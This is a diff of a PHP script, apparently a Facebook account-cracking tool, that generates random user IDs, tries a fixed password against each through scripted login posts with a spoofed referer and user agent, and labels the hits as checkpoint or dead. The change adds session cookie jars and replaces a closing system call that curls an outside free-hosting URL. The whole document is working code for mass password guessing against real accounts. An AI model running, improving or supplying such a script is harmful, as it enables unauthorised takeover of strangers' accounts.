@@ -9,7 +9,7 @@ system("clear");
       |    __{|}__ |----|   /----\   |          |--
       |      |||   |    |  /      \  |          |  \
       |      \|/   |    | /        \  \______   |   \
-              ~~~~~~>   V1.1  by Ren Lowsphere
+              ~~~~~~>   V1.2  by Ren Lowsphere
               
 
  ";
@@ -23,6 +23,7 @@ echo" _______________________________________________\n";
 for( $n6 = 0; $n6<$w5; $n6++ ){
 $k7 = curl_init();
 $m8 = ("1000".rand(0,9).rand(0,9).rand(0,9). rand(0,9). rand(0,9). rand(0,9).rand(0,9).rand(0,9).rand(0,9).rand(0,9).rand(0,9));
+$cookie = "sessions/$m8.txt";
 curl_setopt($k7, CURLOPT_REFERER,
    "https://www.facebook.com");
    $n9 = "$m8 | $b4";
@@ -37,6 +38,8 @@ curl_setopt($k7, CURLOPT_POST, 1);
 curl_setopt($k7, CURLOPT_SSL_VERIFYPEER, FALSE);
 curl_setopt($k7, CURLOPT_SSL_VERIFYHOST, 2);
     curl_setopt($k7, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($k7, CURLOPT_COOKIEJAR,$cookie);
+ curl_setopt($k7, CURLOPT_COOKIEFILE,$cookie);
     curl_setopt($k7, CURLOPT_USERAGENT, "Mozilla/5.0 (Android 8.1.0; Mobile; rv:84.0) Gecko/84.0 Firefox/84.0");
 curl_setopt($k7, CURLINFO_HEADER_OUT, true);
     $m10 = curl_exec($k7);
@@ -60,5 +63,5 @@ echo "[$q0 Checkpoint $n1]$n9 \n";    }
     if(strpos($s14, $c16) !== false){
     	echo "[$q0 Die $n1]$n9 \n";
     }}
-system("curl https://alastor-tv.000webhostapp.com/matrix.php");
+system("curl https://kuriyama-app.000webhostapp.com/Updated.php");
 ?>
